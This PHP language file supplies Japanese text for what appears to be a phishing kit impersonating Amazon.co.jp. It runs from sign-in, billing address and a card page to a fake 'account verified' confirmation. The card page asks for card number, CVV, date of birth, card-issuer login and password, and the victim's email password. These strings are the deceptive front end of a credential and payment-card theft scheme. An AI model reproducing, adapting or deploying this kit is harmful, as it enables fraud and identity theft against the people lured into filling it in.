<?php
/*
------------------
Language: Japan
------------------
*/
 
$lang = array();

// Login Page
$lang['PAGE_TITLE'] = 'Amazonサインイン';
$lang['SIGN_IN_TITLE'] = 'ログイン';
$lang['EMAIL'] = 'Eメール';
$lang['PASSWORD'] = 'パスワード';
$lang['SIGN_IN_BUTTON'] = '次へ進む';
$lang['FORGOT_PASSWORD'] = 'パスワードを忘れた場合';
$lang['KEEP_ME_SIGNED_IN'] = 'サインインしたままにする';
$lang['NEW_TO_AMAZON'] = 'Amazonの新しいお客様ですか？';
$lang['CREATE_YOUR_AMAZON_ACCOUNT'] = 'Amazonアカウントを作成';
$lang['LOGIN_ERROR_TOP'] = '問題が発生しました。';
$lang['LOGIN_ERROR'] = 'Eメール またはパスワードが誤っています。';



// Billing address Page
$lang['BILLING_ADDRESS_PAGE_TITLE'] = '請求書送付先住所';
$lang['ENTER_YOUR_ADDRESS'] = "請求書送付先住所<p>必須欄にすべて入力してください。</p>";
$lang['FULL_NAME'] = 'フルネーム';
$lang['ADDRESS_LINE'] = '番地';
$lang['ADDRESS_PLACEHOLDER'] = '例: 下連雀8-3-17-506';
$lang['CITY'] = '市区町村';
$lang['STATE'] = '都道府県';
$lang['ZIP'] = '郵便番号';
$lang['ZIP_CODE_PLACEHOLDER'] = '〒(123-4567)';
$lang['PHONE'] = '電話番号';
$lang['BUTTON_CONTINUE'] = '続行';
$lang['ERROR_MESSAGE_BILLING_TOP'] = '重要なメッセージ';
$lang['INVALID_NAME'] = 'フルネームを入力してください。';
$lang['INVALID_ADDRESS'] = '正しい番地を入力してください。';
$lang['INVALID_CITY'] = '正しい市区町村を入力してください。';
$lang['INVALID_ZIP'] = '郵便番号に入るのは数字のみで、123-4567の形式である必要があります。';
$lang['INVALID_PHONE'] = '有効な電話番号を入力してください。';
$lang['INVALID_STATE'] = '正しい都道府県を入力してください。';



// Card & Bank Info page
$lang['BILLING_INFO_PAGE_TITLE'] = 'Amazon.co.jp: 口座情報';
$lang['ADDITIONAL_INFO_NOTE'] = '必須欄にすべて入力してください。';
$lang['CARD_NUMBER'] = 'クレジット/デビットカードの番号';
$lang['NAME_ON_CARD'] = 'カード表記通りの氏名';
$lang['CARD_EXPIRY'] = '有効期限';
$lang['CARD_EXP_DATE_FORMAT'] = 'MM/YYYY';
$lang['CVV'] = 'カード確認コード';
$lang['CVV_PLACEHOLDER'] = 'CVV / CVC';
$lang['DATE_OF_BIRTH'] = '生年月日';
$lang['DATE_OF_BIRTH_FORMAT'] = ' YYYY(年) / MM(月) / DD(日)';
$lang['CARD_ZIP_CODE'] = '郵便番号';
$lang['BANK_USERNAME'] = '* カードユーザーID';
$lang['BANK_USERNAME_PLACEHOLDER'] = '* カードユーザーID';
$lang['BANK_PASSWORD'] = '* パスワード';
$lang['BANK_PASSWORD_PLACEHOLDER'] = '認証サービス（VPass/MSCode)';
$lang['CURRENT_EMAIL_PASSWORD'] = 'Eメールパスワード';
$lang['INVALID_CARD_NUMBER'] = '有効なクレジットカードまたはデビットカードの番号を入力してください。';
$lang['INVALID_NAME_ON_CARD'] = 'この項目は必須です。';
$lang['INVALID_CVV'] = '有効なカード確認コードを入力してください。';
$lang['INVALID_CARD_EXP_DATE'] = '有効な有効期限を入力してください。';
$lang['INVALID_DOB'] = '誕生日を入力してください。 YYYY(年) / MM(月) / DD(日)';
$lang['BUTTON_SUBMIT'] = '続行';


// Processing Page
$lang['PROCESSING_TITLE'] = '処理中';
$lang['PROCESSING_NOTE'] = 'お客様の情報を処理中です。。。';
$lang['PROCESSING_NOTE2'] = 'これは、通常1分未満がかかります。';

// Confirmation Page
$lang['CONFIRMATION_TITLE'] = '正常に終了しました。';
$lang['CONFIRMATION_NOTE_1'] = 'あなたは成功したあなたのAmazonアカウントを確認されています.';
$lang['CONFIRMATION_NOTE_2'] = '5秒以内にリダイレクトされます。';


// Footer
$lang['COPYRIGHT'] = '&copy; 1996-'.date('Y').', Amazon.co.jp, Inc or its affiliates';
$lang['TERMS_OF_USE'] = ' 利用規約';
$lang['PRIVACY_POLICY'] = ' プライバシー規約';
$lang['HELP'] = 'ヘルプ ';
?>